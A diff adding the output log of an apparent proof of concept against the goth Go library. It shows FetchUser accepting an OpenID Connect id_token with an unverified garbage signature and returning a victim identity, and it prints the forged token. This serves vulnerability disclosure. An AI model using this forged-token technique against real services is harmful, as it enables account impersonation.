@@ -1,0 +1,9 @@
+built /tmp/tmp769gw79q/poc/../out/poc sha256 41cf33d40cac1703b3432522d8523f0e0f7169f07c94f14bc220ef9ad839ea04
+mode=baseline: id_token returned by the token endpoint is FORGED (garbage header and signature): x.eyJhdWQiOiJnb3RoLXRlc3QtY2xpZW50LWtleSIsImVtYWlsIjoidmljdGltQGV4YW1wbGUuY29tIiwiZXhwIjoxNzk0Njg3NDA3LCJpYXQiOjE3OTQ2ODM3NDcsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6NDI0NzMiLCJuYW1lIjoiVmljdGltIFVzZXIiLCJwaWN0dXJlIjoiaHR0cDovL2V2aWwuZXhhbXBsZS9hdmF0YXIucG5nIiwic3ViIjoidmljdGltLXVzZXItMTIzNDUifQ.x
+code exchange done: session now carries id_token="x.eyJhdWQiOiJnb3RoLXRlc3QtY2xpZW50LWtleSIsImVtYWlsIjoidmljdGltQGV4YW1wbGUuY29tIiwiZXhwIjoxNzk0Njg3NDA3LCJpYXQiOjE3OTQ2ODM3NDcsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6NDI0NzMiLCJuYW1lIjoiVmljdGltIFVzZXIiLCJwaWN0dXJlIjoiaHR0cDovL2V2aWwuZXhhbXBsZS9hdmF0YXIucG5nIiwic3ViIjoidmljdGltLXVzZXItMTIzNDUifQ.x" (from the token endpoint response)
+FetchUser SUCCEEDED on the token from the attacker-controlled token endpoint
+authenticated user: UserID="victim-user-12345" Email="victim@example.com" Name="Victim User" Provider="openid-connect"
+RawData: map[aud:goth-test-client-key email:victim@example.com exp:1.794687407e+09 iat:1.794683747e+09 iss:http://127.0.0.1:42473 name:Victim User picture:http://evil.example/avatar.png sub:victim-user-12345]
+accepted token segments: header="x" payload_len=286 signature="x"
+reference verifier (golang-jwt) rejects the forged token: true
+effect happened: goth.FetchUser accepted an ID token with a garbage (never verified) signature and returned the victim identity
